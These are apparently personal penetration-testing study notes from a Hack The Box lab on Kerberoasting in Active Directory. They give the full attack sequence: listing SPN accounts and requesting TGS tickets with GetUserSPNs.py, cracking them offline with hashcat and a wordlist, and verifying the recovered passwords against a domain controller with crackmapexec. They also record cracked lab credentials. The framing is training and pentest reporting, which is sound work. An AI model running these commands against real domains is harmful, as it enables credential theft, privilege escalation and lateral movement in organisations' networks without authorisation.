Kerberoasting is a lateral movement/privilege escalation technique in Active Directory environments which targets `SPN`

_(SPN)_ is a unique identifier of a service instance. `[Kerberos authentication]` uses SPNs to associate a service instance with a service sign-in account


## Kerberoasting - Performing the Attack
- kali attack box > gained user cred part of domain > access in terms of the user pwned
- kali attack box > domain joined > get keytab file as root
- From a domain-joined Windows host authenticated as a domain user.
- From a domain-joined Windows host with a shell in the context of a domain account.
- As SYSTEM on a domain-joined Windows host.
- From a non-domain joined Windows host using [runas](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525\(v=ws.11\)) /netonly.

----
if kerbroasting attack gained us set of cred its critical finding in our report
otherwise its medium risk but still must be added to the report

---

>> `We must also know which host in the domain is a Domain Controller so we can query it.`

---

#### GetUserSPNs.py
check-list:
```shell-session
GAOL: >> Queries target domain for SPNs that are running under a user account
```
>>`need a set of valid domain credentials and the IP address of a Domain Controller.`

```
authenticate to the Domain Controller with a 
cleartext password, 
NT password hash, 
Kerberos ticket
```
NOTE:
```
investigating the group membership of all accounts because we may find an account with an easy-to-crack ticket that can help us further our goal of moving laterally/vertically in the target domain.
```
---
#### Listing SPN Accounts
```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/wley

[SMB] NTLMv2-SSP Username : INLANEFREIGHT\wley <> transporter@4
```
#### Requesting all TGS Tickets
the ticket is encrypted using spn password hash
```bash
AhmaDb0x@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 
```
#### Requesting a Single TGS ticket
```bash
AhmaDb0x@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/wley -request-user SAPService
```
#### to-output-file
```bash
AhmaDb0x@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```

#### Cracking the Ticket Offline with Hashcat
```bash
AhmaDb0x@htb[/htb]$ hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 
```

#### Testing Authentication against a Domain Controller
```bash
AhmaDb0x@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```


!SapperFi2 <> SAPService





